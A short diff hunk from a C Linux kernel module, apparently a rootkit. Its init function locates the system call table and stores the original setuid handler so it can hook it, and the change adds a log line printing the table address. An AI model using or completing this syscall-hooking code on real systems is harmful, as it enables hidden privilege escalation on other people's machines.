@@ -88,7 +88,7 @@ static int __init hload(void)
 {
 	/* Set syscall table address */
 	set_sct_addr();
-
+	printk(KERN_INFO "[+] Got sys call table address: 0x%x",sct_address);
 	/* Set the address to the setuid call to our origin setuid call */
 	origin_suidcall = sct_address[__NR_setuid];
 
